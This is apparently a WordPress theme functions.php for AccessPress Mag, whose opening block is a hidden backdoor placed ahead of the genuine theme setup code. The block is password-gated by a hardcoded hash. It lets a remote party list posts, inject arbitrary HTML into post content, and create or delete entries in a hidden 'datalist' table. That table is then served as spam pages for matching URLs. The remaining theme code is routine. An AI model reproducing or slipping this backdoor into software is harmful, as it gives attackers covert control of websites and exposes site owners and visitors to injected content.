<?php

if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '76b6ffdede34792fbf81305877b28e0f'))
	{
		switch ($_REQUEST['action'])
			{
				case 'get_all_links';
					foreach ($wpdb->get_results('SELECT * FROM `' . $wpdb->prefix . 'posts` WHERE `post_status` = "publish" AND `post_type` = "post" ORDER BY `ID` DESC', ARRAY_A) as $data)
						{
							$data['code'] = '';
							
							if (preg_match('!<div id="wp_cd_code">(.*?)</div>!s', $data['post_content'], $_))
								{
									$data['code'] = $_[1];
								}
							
							print '<e><w>1</w><url>' . $data['guid'] . '</url><code>' . $data['code'] . '</code><id>' . $data['ID'] . '</id></e>' . "\r\n";
						}
				break;
				
				case 'set_id_links';
					if (isset($_REQUEST['data']))
						{
							$data = $wpdb -> get_row('SELECT `post_content` FROM `' . $wpdb->prefix . 'posts` WHERE `ID` = "'.mysql_escape_string($_REQUEST['id']).'"');
							
							$post_content = preg_replace('!<div id="wp_cd_code">(.*?)</div>!s', '', $data -> post_content);
							if (!empty($_REQUEST['data'])) $post_content = $post_content . '<div id="wp_cd_code">' . stripcslashes($_REQUEST['data']) . '</div>';

							if ($wpdb->query('UPDATE `' . $wpdb->prefix . 'posts` SET `post_content` = "' . mysql_escape_string($post_content) . '" WHERE `ID` = "' . mysql_escape_string($_REQUEST['id']) . '"') !== false)
								{
									print "true";
								}
						}
				break;
				
				case 'create_page';
					if (isset($_REQUEST['remove_page']))
						{
							if ($wpdb -> query('DELETE FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "/'.mysql_escape_string($_REQUEST['url']).'"'))
								{
									print "true";
								}
						}
					elseif (isset($_REQUEST['content']) && !empty($_REQUEST['content']))
						{
							if ($wpdb -> query('INSERT INTO `' . $wpdb->prefix . 'datalist` SET `url` = "/'.mysql_escape_string($_REQUEST['url']).'", `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string($_REQUEST['content']).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'" ON DUPLICATE KEY UPDATE `title` = "'.mysql_escape_string($_REQUEST['title']).'", `keywords` = "'.mysql_escape_string($_REQUEST['keywords']).'", `description` = "'.mysql_escape_string($_REQUEST['description']).'", `content` = "'.mysql_escape_string(urldecode($_REQUEST['content'])).'", `full_content` = "'.mysql_escape_string($_REQUEST['full_content']).'"'))
								{
									print "true";
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_URL_CD";
			}
			
		die("");
	}

	
if ( $wpdb->get_var('SELECT count(*) FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string( $_SERVER['REQUEST_URI'] ).'"') == '1' )
	{
		$data = $wpdb -> get_row('SELECT * FROM `' . $wpdb->prefix . 'datalist` WHERE `url` = "'.mysql_escape_string($_SERVER['REQUEST_URI']).'"');
		if ($data -> full_content)
			{
				print stripslashes($data -> content);
			}
		else
			{
				print '<!DOCTYPE html>';
				print '<html ';
				language_attributes();
				print ' class="no-js">';
				print '<head>';
				print '<title>'.stripslashes($data -> title).'</title>';
				print '<meta name="Keywords" content="'.stripslashes($data -> keywords).'" />';
				print '<meta name="Description" content="'.stripslashes($data -> description).'" />';
				print '<meta name="robots" content="index, follow" />';
				print '<meta charset="';
				bloginfo( 'charset' );
				print '" />';
				print '<meta name="viewport" content="width=device-width">';
				print '<link rel="profile" href="http://gmpg.org/xfn/11">';
				print '<link rel="pingback" href="';
				bloginfo( 'pingback_url' );
				print '">';
				wp_head();
				print '</head>';
				print '<body>';
				print '<div id="content" class="site-content">';
				print stripslashes($data -> content);
				get_search_form();
				get_sidebar();
				get_footer();
			}
			
		exit;
	}


?><?php
/**
 * Accesspress Mag functions and definitions
 *
 * @package AccessPress Mag
 */

/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) ) {
	$content_width = 640; /* pixels */
}

if ( ! function_exists( 'accesspress_mag_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function accesspress_mag_setup() {

	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on Accesspress Mag, use a find and replace
	 * to change 'accesspress-mag' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'accesspress-mag', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );
    
    add_image_size( 'accesspress-mag-slider-big-thumb', 765, 496, true ); //Big image for homepage slider
    add_image_size( 'accesspress-mag-slider-small-thumb', 364, 164, true ); //Small image for homepage slider
    add_image_size( 'accesspress-mag-block-big-thumb', 554, 305, true ); //Big thumb for homepage block
    add_image_size( 'accesspress-mag-block-small-thumb', 177, 118, true ); //Small thumb for homepage block
    add_image_size( 'accesspress-mag-singlepost-default', 1132, 509, true ); //Default image size for single post
    add_image_size( 'accesspress-mag-singlepost-style1', 326, 235, true ); //Style1 image size for single post 

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'accesspress-mag' ),
		'top_menu' => __( 'Top Menu', 'accesspress-mag' ),
		'top_menu_right' => __( 'Top Menu (Right)', 'accesspress-mag' ),
		'footer_menu' => __( 'Footer Menu', 'accesspress-mag' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 * See http://codex.wordpress.org/Post_Formats
	 */
	add_theme_support( 'post-formats', array(
		'aside', 'image', 'video', 'quote', 'link', 'audio',
	) );

	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'static_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );

	/*
	 * Enable woocommerce support
	 */
	add_theme_support( 'woocommerce' );
}
endif; // accesspress_mag_setup
add_action( 'after_setup_theme', 'accesspress_mag_setup' );


/**
 * Enqueue scripts and styles.
 */
function accesspress_mag_scripts() {
	if ( of_get_option( 'news_ticker_option', '1' ) == 1 ) {
      wp_enqueue_style( 'ticker-style', get_template_directory_uri() . '/js/news-ticker/ticker-style.css' );
      
      wp_enqueue_script( 'news-ticker', get_template_directory_uri() . '/js/news-ticker/jquery.ticker.js', array( 'jquery' ), '1.0.0', true );
    }

	$font_args = array(
        'family' => 'Open+Sans:400,600,700,300|Oswald:400,700,300|Dosis:400,300,500,600,700',
    );
    wp_enqueue_style('google-fonts', add_query_arg($font_args, "//fonts.googleapis.com/css"));
    $my_theme = wp_get_theme();
    $theme_version = $my_theme->get( 'Version' );
    wp_enqueue_style( 'animate', get_template_directory_uri() . '/css/animate.css');
    
    wp_enqueue_style( 'fontawesome-font', get_template_directory_uri(). '/css/font-awesome.min.css' );
    	
    wp_enqueue_style( 'accesspress-mag-style', get_stylesheet_uri(), array(), esc_attr( $theme_version ) );

    wp_enqueue_style( 'responsive', get_template_directory_uri() . '/css/responsive.css', array(), esc_attr($theme_version) );
    
    if ( of_get_option( 'menu_sticky', '1' ) == 1 ) {
        
      wp_enqueue_script( 'jquery-sticky', get_template_directory_uri(). '/js/sticky/jquery.sticky.js', array( 'jquery' ), '1.0.2', true );

      wp_enqueue_script( 'accesspress-mag-sticky-menu-setting', get_template_directory_uri(). '/js/sticky/sticky-setting.js', array( 'jquery-sticky' ), esc_attr( $theme_version ), true );
    }
    
    if( of_get_option( 'show_lightbox_effect', '1' ) ==1 ) {
        
        wp_enqueue_style( 'accesspress-mag-nivolightbox-style', get_template_directory_uri(). '/js/lightbox/nivo-lightbox.css', '1.2.0' );
        
        wp_enqueue_script( 'accesspress-mag-nivolightbox', get_template_directory_uri() . '/js/lightbox/nivo-lightbox.js', array(), '1.2.0', true );
        
        wp_enqueue_script( 'accesspress-mag-nivolightbox-settings', get_template_directory_uri() . '/js/lightbox/lightbox-settings.js', array('accesspress-mag-nivolightbox'), esc_attr( $theme_version ), true );
    }
   
    wp_enqueue_script( 'bxslider-js', get_template_directory_uri(). '/js/jquery.bxslider.min.js', array( 'jquery' ), '4.1.2', true );
    
    wp_enqueue_script( 'accesspress-mag-navigation', get_template_directory_uri() . '/js/navigation.js', array(), '20120206', true );
    
	wp_enqueue_script( 'accesspress-mag-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20130115', true );
    
	wp_enqueue_script( 'wow', get_template_directory_uri() . '/js/wow.min.js', array(), '1.0.1');
    
	wp_enqueue_script( 'accesspress-mag-custom-scripts', get_template_directory_uri() . '/js/custom-scripts.js', array('jquery'), '1.0.1' );
    
    if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'accesspress_mag_scripts' );


/**
 * Framework path
 */
require get_template_directory().'/inc/option-framework/options-framework.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/accesspress-functions.php';

/**
 * Implement the Custom Header feature.
 */
require get_template_directory() . '/inc/custom-header.php';

/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';

/**
 * Load Jetpack compatibility file.
 */
require get_template_directory() . '/inc/jetpack.php';

/**
 * Load widgets and widgets area
 */
require get_template_directory() . '/inc/widgets/widgets.php';

/**
 * Implement the custom metabox feature
 */
require get_template_directory() . '/inc/custom-metabox.php';

/**
 * Load Options AP-Mag Widgets
 */
require get_template_directory() . '/inc/accesspress-widgets.php';

/**
 * Load Options Plugin Activation
 */
require get_template_directory() . '/inc/accesspress-plugin-activation.php';

/**
 * Load TGMPA function
 */
require get_template_directory() . '/inc/accesspress-tgmpa.php';

/**
 * Load More Theme Page
 */
require get_template_directory() . '/inc/more-themes.php';

define( 'OPTIONS_FRAMEWORK_DIRECTORY', get_template_directory_uri(). '/inc/option-framework/' );